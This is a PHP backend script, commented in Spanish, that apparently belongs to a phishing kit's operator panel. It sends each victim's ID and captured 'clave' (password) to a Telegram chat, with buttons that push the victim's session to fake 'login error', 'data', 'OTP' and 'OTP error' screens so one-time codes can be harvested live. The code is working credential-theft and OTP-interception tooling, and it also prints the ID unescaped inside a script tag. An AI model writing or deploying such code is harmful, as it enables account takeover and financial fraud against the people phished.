<?php
// Habilitar errores para depuración (quitar en producción)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Incluir las credenciales desde config.php
$config = require '../../config/config.php';

// Conexión a la base de datos
$dbConfig = $config['db'];
try {
    $pdo = new PDO(
        "mysql:host={$dbConfig['host']};dbname={$dbConfig['dbname']}",
        $dbConfig['user'],
        $dbConfig['password']
    );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(["error" => "Error de conexión a la base de datos: " . $e->getMessage()]);
    exit();
}

// Verificar si los datos vienen por GET o POST
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['id'])) {
    // Datos por GET
    $clienteId = $_GET['id'];
    $clave = $_GET['clave'] ?? '';
    $nuevoEstado = $_GET['estado'] ?? 0;
} else {
    // Datos por POST (JSON)
    $data = json_decode(file_get_contents("php://input"), true);
    
    // Validar que los datos requeridos estén presentes
    if (!isset($data['id'])) {
        http_response_code(400);
        echo json_encode(["error" => "Faltan datos requeridos (id)."]);
        exit();
    }
    
    $clienteId = $data['id'];
    $clave = $data['clave'] ?? '';
    $nuevoEstado = $data['estado'] ?? 0;
}

// Función para enviar mensaje a Telegram con botones que incluyen URLs
function enviarMensajeTelegram($clienteId, $clave, $config) {
    $botToken = $config['telegram']['bot_token'];
    $chatId = $config['telegram']['chat_id'];
    $baseUrl = $config['base_url']; // URL base para los botones

    // Mensaje simple con solo ID y clave
    $mensaje = "🆔 *ID:* $clienteId\n" .
               "🔑 *Clave:* $clave";

    // Botones interactivos con URLs
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2"],
                ['text' => '📋 Datos', 'url' => "$baseUrl?id=$clienteId&estado=6"]
            ],
            [
                ['text' => '🔐 OTP', 'url' => "$baseUrl?id=$clienteId&estado=3"],
                ['text' => '⚠️ OTP Error', 'url' => "$baseUrl?id=$clienteId&estado=4"]
            ],
            [
                ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=0"]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode($keyboard)
    ];

    // Enviar la solicitud HTTP a Telegram
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($postData),
        ],
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response === false) {
        $error = error_get_last();
        error_log("Error al enviar mensaje a Telegram: " . $error['message']);
        return false;
    }
    return true;
}

try {
    // 1. Actualizar el estado del cliente en la base de datos
    $stmt = $pdo->prepare("UPDATE clientes SET estado = ? WHERE id = ?");
    $stmt->execute([$nuevoEstado, $clienteId]);

    // Comprobar si se actualizó alguna fila
    if ($stmt->rowCount() === 0) {
        throw new Exception("No se encontró un cliente con el ID proporcionado o el estado ya es el mismo.");
    }

    // 2. Enviar mensaje a Telegram con botones (solo si es estado 0 - inicial)
    if ($nuevoEstado == 0) {
        try {
            enviarMensajeTelegram($clienteId, $clave, $config);
        } catch (Exception $e) {
            error_log("Error al enviar a Telegram: " . $e->getMessage());
            // No lanzamos excepción para no interrumpir el flujo principal
        }
    }

    // 3. Enviar una respuesta
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        // Para peticiones GET, mostrar HTML con script para cerrar la ventana
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Proceso Completado</title>
            <script>
                alert("Estado actualizado correctamente para ID: ' . $clienteId . '");
                window.close(); // Cierra la ventana actual
                
                // Si window.close() no funciona (depende del navegador), intentar alternativas
                setTimeout(function() {
                    if (!window.closed) {
                        window.history.back(); // Intentar volver atrás
                    }
                }, 1000);
            </script>
        </head>
        <body>
            <p>Proceso completado. Esta ventana se cerrará automáticamente.</p>
        </body>
        </html>';
    } else {
        // Para peticiones POST, enviar JSON normal
        echo json_encode(["success" => true, "message" => "Estado actualizado correctamente."]);
    }
    exit();

} catch (Exception $e) {
    http_response_code(500);
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Error</title>
            <script>
                alert("Error: ' . addslashes($e->getMessage()) . '");
                window.close(); // Cerrar incluso en caso de error
            </script>
        </head>
        <body>
            <p>Ocurrió un error. Esta ventana se cerrará automáticamente.</p>
        </body>
        </html>';
    } else {
        echo json_encode(["error" => "Error: " . $e->getMessage()]);
    }
}
?>